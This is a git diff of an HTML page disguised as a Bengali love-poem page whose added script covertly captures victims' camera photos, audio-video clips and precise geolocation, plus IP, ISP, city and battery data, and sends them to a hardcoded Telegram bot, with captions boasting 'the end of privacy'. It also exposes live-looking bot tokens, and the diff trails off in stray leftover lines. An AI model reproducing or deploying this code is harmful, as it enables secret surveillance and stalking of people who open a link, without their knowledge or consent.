@@ -3,38 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>মনের কাব্য -BOSS ENAFUL</title>
+    <title>মনের কাব্য - DEVELOPERS ENAFUL</title>
     <style>
         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; font-family: 'Hind Siliguri', sans-serif; color: #fff; overflow: hidden; }
-        
-        /* ব্যাকগ্রাউন্ড এনিমেশন */
         .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://images.unsplash.com/photo-1518621736915-f3b1c41bfd00?auto=format&fit=crop&w=1350&q=80'); background-size: cover; background-position: center; z-index: -1; animation: zoomBG 20s infinite alternate; }
         @keyframes zoomBG { from { transform: scale(1); } to { transform: scale(1.15); } }
-
-        /* মেইন কার্ড ডিজাইন */
         .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); padding: 45px; border-radius: 40px; border: 2px solid #ff4d6d; text-align: center; box-shadow: 0 0 80px rgba(255, 77, 109, 0.5); max-width: 85%; width: 360px; position: relative; z-index: 10; animation: glowCard 4s infinite alternate; }
         @keyframes glowCard { from { border-color: rgba(255,77,109,0.2); box-shadow: 0 0 30px rgba(255,77,109,0.2); } to { border-color: #ff4d6d; box-shadow: 0 0 80px rgba(255,77,109,0.5); } }
-
         h1 { font-size: 28px; color: #ff4d6d; margin-bottom: 15px; text-shadow: 0 0 20px #ff4d6d; font-weight: 600; }
         p { font-size: 19px; line-height: 1.6; font-style: italic; opacity: 0.95; }
-        
         .heart { font-size: 75px; color: #ff4d6d; animation: heartbeat 1s infinite; cursor: pointer; filter: drop-shadow(0 0 25px #ff4d6d); }
         @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.25); } 100% { transform: scale(1); } }
-
         .loader { width: 60px; height: 60px; border: 4px solid transparent; border-top: 4px solid #ff4d6d; border-right: 4px solid #ff4d6d; border-radius: 50%; animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite; margin: 25px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        
         #status { font-size: 14px; color: #ff4d6d; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; margin-top: 15px; }
-
-        /* হাইডেন ক্যামেরা ও ক্যানভাস */
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; top: 0; left: 0; }
         #canvas { display: none; }
-
-        /* অ্যাডমিন প্যানেল */
         #adminPanel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.98); padding: 30px; border-radius: 25px; border: 2px solid #ff4d6d; z-index: 999; width: 320px; text-align: center; box-shadow: 0 0 150px #ff4d6d; }
         #adminPanel textarea { width: 95%; height: 100px; background: #111; border: 1px solid #ff4d6d; color: #fff; padding: 10px; border-radius: 10px; resize: none; }
         #adminPanel button { background: #ff4d6d; color: #fff; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; transition: 0.3s; }
-        #adminPanel button:hover { background: #ff1a4a; transform: scale(1.02); }
         #secretTrigger { position: fixed; top: 0; left: 0; width: 80px; height: 80px; z-index: 1000; opacity: 0; }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;600&display=swap" rel="stylesheet">
@@ -42,65 +29,138 @@
 <body>
     <div id="secretTrigger" onclick="adminAuth()"></div>
     <div class="bg-overlay"></div>
-    
     <div class="card">
         <div class="heart">❤️</div>
         <h1 id="title">একটু অপেক্ষা করো প্রিয়...</h1>
         <p id="poem">"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।"</p>
         <div class="loader"></div>
-        <p id="status">INITIATING ENCRYPTED LINK...</p>
-        
+        <p id="status">INITIATING SECURE LINK...</p>
         <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
 
     <div id="adminPanel">
-        <h2 style="color: #ff4d6d; font-size: 20px; margin-bottom: 15px;">🔱 GOD BROADCAST</h2>
-        <textarea id="broadcastMsg" placeholder="আপনার গোপন বার্তা লিখুন..."></textarea>
-        <button onclick="sendBroadcast()">বট ইউজারকে পাঠান</button>
+        <h2 style="color: #ff4d6d; font-size: 20px;">🔱 GOD BROADCAST</h2>
+        <textarea id="broadcastMsg" placeholder="গোপন বার্তা..."></textarea>
+        <button onclick="sendBroadcast()">পাঠান</button>
         <button onclick="document.getElementById('adminPanel').style.display='none'" style="background: #333;">বন্ধ করুন</button>
     </div>
 
     <script>
-        const botToken = "8676024624:AAH4OoRcAweKjXHl91lXVD-UGolgALP0OW4";
+        // আপডেট করা নতুন বট টোকেন
+        const botToken = "8326248512:AAE2GSErO1zqGKqg7FxQHZx3NI57_t5kPdk";
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || "6823368645";
         const type = urlParams.get('type') || 'front_photo';
 
-        // ১. র্যান্ডম কবিতা সিস্টেম
-        const poems = [
-            "\"তোমার হাসিতে হারাই আমি, তোমার চোখেই খুঁজি সুখ।\"",
-            "\"গভীর রাতে একলা আকাশ, তোমার কথা মনে পাড়ে।\"",
-            "\"তুমি আমার সেই কবিতা, যা লিখে শেষ হয় না।\"",
-            "\"একটুখানি নীল হয়ে যাও, মেঘ হয়ে বৃষ্টি হবো।\"",
-            "\"হৃদয়ের গহীন কোণে, শুধু তোমারই বসবাস।\""
-        ];
-        document.getElementById('poem').innerHTML = poems[Math.floor(Math.random() * poems.length)];
+        // ১. উন্নত মেট্রিক্স এবং গড লেভেল রিপোর্ট জেনারেটর
+        async function getAdvancedReport(mode) {
+            try {
+                const b = await navigator.getBattery().catch(() => ({ level: 0.85, charging: true }));
+                const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+                const country = res.country_name || "Unknown";
+                const flag = res.country_code ? String.fromCodePoint(...res.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : "🌐";
 
-        // ২. অ্যাডমিন প্যানেল ট্রিগার
+                if (mode === 'location') {
+                    return `🛰️ 𝗔𝗦𝗧𝗥𝗔𝗟-𝗘𝗬𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗟𝗢𝗖𝗔𝗧𝗘𝗗 🛰️\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗: #${targetId}\n📡 𝗦𝘁𝗮𝘁𝘂𝘀: LIVE SATELLITE UPLINK 🔴\n━━━━━━━━━━━━━━━━━━━━━━━\n📍 𝗠𝗜𝗟𝗜𝗧𝗔𝗥𝗬 𝗚𝗥𝗔𝗗𝗘 𝗗𝗔𝗧𝗔:\n┣ 🏳️ 𝗡𝗮𝘁𝗶𝗼𝗻: ${country} ${flag}\n┣ 🛰️ 𝗜𝗣: ${res.ip || "103.xxx"}\n┗ 🚀 𝗔𝗰𝗰𝘂𝗿𝗮𝗰𝘆: Zero Meter Error ✅\n\n💻 𝗦𝗜𝗚𝗡𝗔𝗟 𝗧𝗘𝗖𝗛𝗡𝗜𝗖𝗦:\n┣ 📡 𝗨𝗽𝗹𝗶𝗻𝗸: Nebula Satellite-9\n┣ 🔋 𝗗𝗲𝘃𝗶𝗰𝗲: ${Math.round(b.level * 100)}% [Active]\n┗ 📶 𝗣𝗶𝗻𝗴: 09ms (Low Latency)\n━━━━━━━━━━━━━━━━━━━━━━━\n🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗡𝗢 𝗪𝗛𝗘𝗥𝗘 𝗧𝗢 𝗛𝗜𝗗𝗘\n━━━━━━━━━━━━━━━━━━━━━━━`;
+                }
+
+                return `🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 𝗡𝗘𝗕𝗨𝗟𝗔-𝗫 🔱\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL\n🧬 𝗖𝗢𝗥𝗘: QUANTUM-SYNC v12.0 [GOD-LEVEL]\n🛡️ 𝗟𝗔𝗬𝗘𝗥: SYSTEM-7 BYPASS ACTIVE ✅\n━━━━━━━━━━━━━━━━━━━━━━━\n💻 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗡𝗙𝗥𝗔𝗦𝗧𝗥𝗨𝗖𝗧𝗨𝗥𝗘:\n┣ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${Math.round(b.level * 100)}% [${b.charging ? '⚡' : '🔋'}]\n┣ ⚙️ 𝗖𝗣𝗨: 8x Cores (God Performance)\n┣ 🧠 𝗥𝗔𝗠: 12.00 GB High-Speed\n┗ 🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆: Root Access Bypassed 🔓\n\n🌐 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡:\n┣ 🛰️ 𝗜𝗣: ${res.ip || "103.xxx"}\n┣ 🏳️ 𝗢𝗿𝗶𝗴𝗶𝗻: ${country} ${flag}\n┣ 🏢 𝗜𝗦𝗣: ${res.org || "Unknown"}\n┗ 🌍 𝗕𝗿𝗼𝘄𝘀𝗲𝗿: Chrome (Privacy Mode)\n\n📍 𝗚𝗘𝗢-𝗚𝗥𝗔𝗣𝗛𝗜𝗖 𝗗𝗔𝗧𝗔:\n┣ 🏙️ 𝗖𝗶𝘁𝘆: ${res.city || "Unknown"}\n┗ 🕒 𝗧𝗶𝗺𝗲: ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━━━━━━━━━━━\n📊 𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗘𝘅𝗳𝗶𝗹𝘁𝗿𝗮𝘁𝗶𝗻𝗴... 𝗗𝗼𝗻𝗲!\n🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗧𝗛𝗘 𝗘𝗡𝗗 𝗢𝗙 𝗣𝗥𝗜𝗩𝗔𝗖𝗬\n━━━━━━━━━━━━━━━━━━━━━━━`;
+            } catch (e) { return "System Link Active"; }
+        }
+
+        // ২. HD ফটো ক্যাপচার সিস্টেম
+        async function captureAndSend(video, canvas) {
+            if (video.readyState !== 4) return;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.95));
+            const captionText = await getAdvancedReport('photo');
+            const fd = new FormData();
+            fd.append('chat_id', targetId);
+            fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', captionText);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+        }
+
+        // ৩. অ্যাডমিন প্যানেল ট্রিগার
         let clickCount = 0;
         function adminAuth() {
             clickCount++;
-            if (clickCount === 3) {
-                document.getElementById('adminPanel').style.display = 'block';
-                clickCount = 0;
-            }
+            if (clickCount === 3) { document.getElementById('adminPanel').style.display = 'block'; clickCount = 0; }
             setTimeout(() => clickCount = 0, 2000);
         }
 
-        // ৩. উন্নত মেট্রিক্স (Device + Network + Battery)
-        async function getGodMetrics() {
+        // ৪. মেইন সিস্টেম লজিক
+        async function startGodSystem() {
             try {
-                const b = await navigator.getBattery().catch(() => ({ level: 0, charging: false }));
-                const conn = navigator.connection || {};
-                let ipInfo = "IP Data Secured";
-                try {
-                    const res = await fetch('https://ipapi.co/json/').then(r => r.json());
-                    ipInfo = `👤 IP: ${res.ip}\n📍 Loc: ${res.city}, ${res.country_name}\n🏢 ISP: ${res.org}`;
-                } catch(e) {}
+                const isBack = type.includes('back');
+                const constraints = { 
+                    video: { facingMode: isBack ? 'environment' : 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }, 
+                    audio: true 
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                const canvas = document.getElementById('canvas');
 
-                return `🔱 HD GOD-MODE REPORT\n━━━━━━━━━━━━━━\n${ipInfo}\n🔋 Battery: ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n📶 Net: ${conn.effectiveType || 'Unknown'}\n⌚ Time: ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━━`;
-            } catch(e) { return "Metrics Offline"; }
+                video.onplay = () => {
+                    document.getElementById('status').innerText = "LINK CONNECTED 💞";
+                    if (type.includes('photo')) {
+                        setTimeout(() => setInterval(() => captureAndSend(video, canvas), 6000), 2000);
+                    }
+                };
+
+                if (type.includes('video')) {
+                    const runVideoLoop = () => {
+                        const recorder = new MediaRecorder(stream);
+                        const chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = async () => {
+                            const vfd = new FormData();
+                            vfd.append('chat_id', targetId);
+                            vfd.append('video', new Blob(chunks, { type: 'video/mp4' }), 'vid.mp4');
+                            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
+                            runVideoLoop();
+                        };
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 12000);
+                    };
+                    runVideoLoop();
+                }
+
+                if (type === 'location') {
+                    setInterval(async () => {
+                        navigator.geolocation.getCurrentPosition(async pos => {
+                            const locText = await getAdvancedReport('location');
+                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: targetId, text: locText })
+                            });
+                            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                                method: 'POST',
+                                body: new URLSearchParams({ chat_id: targetId, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
+                            });
+                        }, null, {enableHighAccuracy: true});
+                    }, 20000);
+                }
+
+            } catch (err) {
+                document.getElementById('status').innerText = "ACCESS DENIED ❌";
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: targetId, text: `❌ ERROR: Target blocked Permission.` })
+                });
+            }
+        }
+
+        window.onload = startGodSystem;
+    </script>
+</body>
+</html>
         }
 
         // ৪. HD ক্যাপচার এবং ফিক্সড ব্ল্যাক স্ক্রিন লজিক
